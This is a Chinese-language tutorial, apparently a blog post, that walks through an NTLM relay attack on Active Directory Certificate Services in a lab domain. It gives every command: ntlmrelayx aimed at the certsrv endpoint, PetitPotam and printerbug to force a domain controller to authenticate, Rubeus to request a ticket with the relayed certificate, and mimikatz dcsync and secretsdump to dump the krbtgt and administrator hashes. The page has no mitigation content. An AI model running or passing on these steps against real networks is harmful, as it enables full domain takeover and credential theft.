        由于ADCS的http证书接口没有启用NTLM中继保护，因此其易受NTLM Relay攻击。而且Authorization HTTP 标头明确只允许通过 NTLM 身份验证，因此Kerberos协议无法使用。因此，攻击者可以利用NTLM Relay攻击ADCS证书服务。

![](https://img-blog.csdnimg.cn/img_convert/7ec1d65b89762479902724191b0f5927.png)

```
http://10.211.55.4/certsrv/certfnsh.asp
```


![](https://img-blog.csdnimg.cn/img_convert/462edd9a34058432053cfb2007c466c8.png)

### 漏洞复现

定位证书服务器机器

```
certutil -config - -ping
```


![](https://img-blog.csdnimg.cn/img_convert/736959d57f3c4c2b741d0f46148c3218.png)

ntlmrelayx监听，这里需要新的impacket：[GitHub - ExAndroidDev/impacket at ntlmrelayx-adcs-attack](https://github.com/ExAndroidDev/impacket/tree/ntlmrelayx-adcs-attack "GitHub - ExAndroidDev/impacket at ntlmrelayx-adcs-attack")

```
python3 ntlmrelayx.py -t http://10.211.55.4/certsrv/certfnsh.asp -smb2support --adcs --template 'domain controller'
```


![](https://img-blog.csdnimg.cn/img_convert/cf1e8f52d244c50366f64ca72072f973.png)

使用脚本触发辅助域控回连我们的攻击机器，这里可以使用最新的Petitpotam.py，也可以使用printerbug.py

```
python3 Petitpotam.py -d xie.com -u hack -p P@ss1234 10.211.55.2 10.211.55.5

#或者使用printerbug.py也可以触发
python3 printerbug.py xie/hack@10.211.55.5 10.211.55.2
```


![](https://img-blog.csdnimg.cn/img_convert/13c515168150ad811a1eec63124637a8.png)

或

![](https://img-blog.csdnimg.cn/img_convert/1ba43b83c70a52064fcb8144ad9bdfa6.png)

获取到base64编码的证书数据，会打印出很多个base64编码的证书，我们随便选择一个即可。

![](https://img-blog.csdnimg.cn/img_convert/097491587dfd099b4e1361a04270ec47.png)

然后使用Rubeus导入证书数据

```
Rubeus.exe asktgt /user:AD02$ /certificate:打印出来的base64的证书数据 /ptt
```


![](https://img-blog.csdnimg.cn/img_convert/d387adef0a3bed3ae04b5ee6d11434c3.png)

![](https://img-blog.csdnimg.cn/img_convert/6ff526cd4ffeba590512f4af2e6ff048.png)

然后使用mimikatz即可导出域内任意用户哈希

```
mimikatz.exe
#查看kerberos票据
kerberos::list
#导出krbtgt用户的hash
lsadump::dcsync /user:krbtgt /csv
```


![](https://img-blog.csdnimg.cn/img_convert/e9620849dc71e631aa9b51d4681e4e7c.png)

或者可以手动导入证书

```
kerberos::ptt ticket.kirbi
```


![](https://img-blog.csdnimg.cn/img_convert/e555041520db0e0eef413b54ccc7cad1.png)

也可以使用kekeo将.kirbi后缀的证书转换为 .ccache后缀的证书，然后使用impacket工具进行利用。

```
misc::convert ccache ticket.kirbi
```


![](https://img-blog.csdnimg.cn/img_convert/9df7c0429b748e07651c458c8313e03d.png)

```
export KRB5CCNAME=AD02\\$\\@XIE.COM\_krbtgt~xie.com\\@XIE.COM.ccaches
proxychains4 -q python3 secretsdump.py -k -no-pass AD01.xie.com -just-dc-user administrator
```


![](https://img-blog.csdnimg.cn/img_convert/d52a0ce9c207bb1a7b7763f759597952.png)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[Active Directory 证书服务攻击与防御（一）](https://www.anquanke.com/post/id/245791#h2-11 "Active Directory 证书服务攻击与防御（一）")

[全补丁域森林5秒沦陷？加密升级之信任雪崩](https://mp.weixin.qq.com/s?__biz=MzU0MDcyMTMxOQ==&mid=2247483735&idx=1&sn=e0ddc385b58caab50a431e49755b051e&scene=21#wechat_redirect "全补丁域森林5秒沦陷？加密升级之信任雪崩")

[https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/ "https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/")

[https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/ "https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/")